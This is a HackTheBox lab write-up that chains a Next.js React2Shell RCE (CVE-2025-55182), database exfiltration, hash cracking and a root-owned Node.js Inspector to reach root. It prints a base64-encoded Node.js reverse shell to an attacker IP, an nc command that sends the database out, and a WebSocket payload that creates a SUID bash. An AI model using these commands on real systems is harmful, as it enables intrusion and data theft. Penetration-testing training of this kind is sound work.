# Reactor — HackTheBox Writeup

> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 24)  
> **CVEs:** CVE-2025-55182 (React2Shell RCE), CVE-2025-29927 (investigated, discarded)  
> **Stack:** Next.js 15.0.3, OpenSSH 9.6p1, SQLite, Node.js Inspector  

## Attack Chain Overview

```text
Next.js 15.0.3 (Port 3000) 
  --> CVE-2025-55182 (RSC Flight Deserialization Prototype Pollution) 
  --> RCE as nextjs
  --> Exfiltrate SQLite DB (/opt/reactorwatch/reactor.db)
  --> Dump Users & Crack MD5 Hash
  --> SSH as engineer
  --> Internal Node.js Inspector on Port 9229 running as Root
  --> Execute JS via WebSocket 
  --> Copy /bin/bash & Apply SUID -> rootbash
```

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Flag](#root-flag)
6. [Key Takeaways](#key-takeaways)
7. [Related Notes](#related-notes)

---

## Reconnaissance

### Port Scanning

I started with a full TCP port scan using [nmap](../../../tools/recon/nmap.md), followed by a targeted service enumeration scan on the open ports.

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p 22,3000 $TARGET -oN service
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js (X-Powered-By: Next.js) |

**Nmap Observations:**
- Port 3000 returned headers `x-nextjs-cache`, `x-nextjs-prerender`, and `X-Powered-By: Next.js`.
- It only accepts `GET` and `HEAD` methods — `OPTIONS` and `POST` without proper headers return a 400 Bad Request.
- The response is pre-rendered with `Cache-Control: s-maxage=31536000` (1-year cache).
- No additional TCP or UDP ports were discovered.

### Web Enumeration

I fuzzed the web application using [feroxbuster](../../../tools/fuzz/feroxbuster.md) to discover hidden directories or assets.

```bash
feroxbuster -u http://$TARGET:3000 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  --status-codes 200 301
```

**Output:**

```text
200  GET  17175c   http://$TARGET:3000/
200  GET   3329c   http://$TARGET:3000/_next/static/chunks/webpack-db0a529a99835594.js
200  GET    463c   http://$TARGET:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js
200  GET  166088c  http://$TARGET:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
200  GET  181180c  http://$TARGET:3000/_next/static/chunks/517-d083b552e04dead1.js
200  GET   6707c   http://$TARGET:3000/_next/static/css/414e1be982bc8557.css
200  GET  112594c  http://$TARGET:3000/_next/static/chunks/polyfills-42372ed130431b0a.js
```

Only the web root `/` and static Next.js assets were exposed. There were no additional routes or redirects.

### Application Analysis

The application is **ReactorWatch — Core Monitoring System v3.2.1**, a nuclear reactor monitoring dashboard.

**Information Extracted from HTML and the Build Manifest:**
- **Framework:** Next.js 15.0.3 (App Router)
- **BuildId:** `L3bimJe_3LvBcFWAnK5L4`
- **Company:** Nuclear Dynamics Corp — FACILITY: SITE-7

The Build Manifest (`/_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js`) confirmed it was a pure App Router configuration:

```javascript
sortedPages: ["/_app", "/_error"]
```

No additional pages were registered — the app consists solely of the public root path.

**Personnel listed on the dashboard (potential system users):**

| Initials | Name | Role | Status |
|----------|------|------|--------|
| DR | Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
| MK | Marcus Kim | Senior Technician | ONLINE |
| JT | James Thompson | Safety Officer | OFFLINE |

---

## Initial Access

### Vulnerability Identification

**CVE-2025-29927 — Middleware Bypass (Discarded)**
This CVE allows bypassing middleware authentication in Next.js by injecting the `x-middleware-subrequest` header. I investigated it extensively, but since the app has no protected routes or redirects, the CVE did not apply.

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://$TARGET:3000/dashboard
# → 404, route does not exist
```

**CVE-2025-55182 — React2Shell RCE ✅**
This is a prototype pollution vulnerability during the deserialization of the RSC Flight protocol in `react-server-dom-webpack` (versions 19.0.0–19.2.0). It permits arbitrary Remote Code Execution (RCE) in the Node.js server process without authentication. Affected Next.js versions are 15.0.0–16.0.6, and the target was running **15.0.3**, making it vulnerable.

**Detection Oracle:**
By sending a POST request to `/` with an invalid `Next-Action` header, the server responded with a 500 status and a body containing `E{"digest"`, confirming vulnerability.

```bash
curl -X POST http://$TARGET:3000/ \
  -H "Content-Type: multipart/form-data" \
  -H "Next-Action: abc123"
```

```http
HTTP/1.1 500
Content-Type: text/x-component

0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"3992125796"}
```

I further confirmed this using Assetnote's `react2shell-scanner`:

```bash
git clone https://github.com/assetnote/react2shell-scanner
cd react2shell-scanner
python3 -m pip install requests --break-system-packages
python3 scanner.py -u http://$TARGET:3000 --safe-check
```

```text
[VULNERABLE] http://$TARGET:3000 - Status: 500
```

### Exploitation — CVE-2025-55182 (RCE)

The attack chain leverages the RSC Flight protocol deserializer in three stages:
1. **Prototype Pollution**: Injecting `"then": "$1:__proto__:then"` writes a `then` function to `Object.prototype`, transforming all objects into "thenables" and hijacking RSC's internal async flow.
2. **Function Constructor Rebind**: Directing `_formData.get` to `"$1:constructor:constructor"` chains `object.constructor` → `Object` → `Object.constructor` → `Function`, fetching the global JavaScript Function constructor.
3. **Code Execution**: The framework internally invokes `_formData.get()` with the `_prefix` value as source code, effectively running `Function(_prefix)()`.

Using a modified [React2Shell script](../../../exploits/web-rce/react2shell-cve-2025-55182.md) that supports dynamic commands, I tested execution:

```bash
python3 exploit.py -u http://$TARGET:3000 --cmd "id"
```

The command output was reflected in the `X-Action-Redirect` header:

```http
X-Action-Redirect: /logina=uid=1000(nextjs) gid=1000(nextjs) groups=1000(nextjs);307
```

To establish a reverse shell while avoiding quote escaping issues in standard `/bin/sh` or bash shells, I opted for a Node.js reverse shell encoded in Base64:

```bash
# Generate the base64 payload
echo -n "node -e '(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(12345, \"10.10.15.73\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'" | base64 -w0
```

```bash
# Start the listener
nc -lvnp 12345

# Send the payload via the exploit
python3 exploit.py -u http://$TARGET:3000 \
  --cmd "echo <BASE64_PAYLOAD> | base64 -d | bash"
```

I successfully obtained a shell as the `nextjs` user (`uid=1000`).

---

## User Flag

Once inside as `nextjs`, I enumerated the system for interesting files:

```bash
ls -la /opt/
ls -la ~
find / -name "*.db" 2>/dev/null
```

I discovered an SQLite database at `/opt/reactorwatch/reactor.db`. I exfiltrated it to my attacking machine:

```bash
# On the victim machine
nc 10.10.15.73 80 < /opt/reactorwatch/reactor.db
```
```bash
# On the attacking machine (Kali)
nc -lvnp 80 > reactor.db
```

Using [sqlite3](../../../tools/database/sqlite3.md), I dumped the users table:

```bash
sqlite3 reactor.db .dump
sqlite3 reactor.db "SELECT * FROM users;"
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

I extracted two MD5 hashes. Verifying against `/etc/passwd` confirmed that the user `engineer` existed on the system.

I cracked the hash using [hashcat](../../../tools/creds/hashcat.md):

```bash
echo "a203b22191d744a4e70ada5c101b17b8" > hashes.txt
echo "39d97110eafe2a9a68639812cd271e8e" >> hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

The hash for `engineer` cracked to `reactor1`. I used this password to SSH into the machine and read the user flag.

```bash
ssh engineer@$TARGET
cat /home/engineer/user.txt
```

---

## Privilege Escalation

Running as `engineer`, I checked the internal services:

```bash
ss -tulpn
ps aux | grep node
```

```text
tcp   LISTEN  0  511  127.0.0.1:9229   *:*
root  1411  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A Node.js process was running as **root** with the V8 debugger (`--inspect`) listening locally on `127.0.0.1:9229`. The [Node.js Inspector](../../../privesc/linux/nodejs-inspector.md) allows unauthenticated WebSocket connections to execute arbitrary JavaScript in the context of the running process.

First, I obtained the WebSocket ID:

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "id": "0e8809c7-fc0e-426d-9e16-0e9dff19842a",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node"
}]
```

I then used a Python script to connect to the WebSocket and execute JavaScript that creates a SUID copy of bash:

```bash
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a')
payload = {
    'id': 1,
    'method': 'Runtime.evaluate',
    'params': {
        'expression': 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\").toString()'
    }
}
ws.send(json.dumps(payload))
print(ws.recv())
ws.close()
"
```

---

## Root Flag

With the SUID binary created by the root Node.js process, I gained a root shell and read the final flag.

```bash
/tmp/rootbash -p
# We are now root
cat /root/root.txt
```

---

## Key Takeaways

1. **Next.js Versioning Matters**: Always pay attention to framework headers (e.g., `X-Powered-By: Next.js`) and cross-reference them with recent CVEs. Next.js 15.0.3 specifically pointed to the React2Shell vulnerability.
2. **Oracle Identification**: 500 internal server errors that contain stack traces or digests (`E{"digest"`) when hitting web frameworks often leak information indicating vulnerability to deserialization attacks.
3. **Database Scavenging**: Any `.db` files lying around in non-standard directories (like `/opt/`) should be immediately exfiltrated and analyzed.
4. **Internal Network Sockets**: Loopback connections (127.0.0.1) often expose highly privileged admin or debugging interfaces, like Node Inspector, which act as trivial PrivEsc vectors if unprotected.

---

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [sqlite3](../../../tools/database/sqlite3.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [react2shell-cve-2025-55182](../../../exploits/web-rce/react2shell-cve-2025-55182.md)
- [nodejs-inspector](../../../privesc/linux/nodejs-inspector.md)
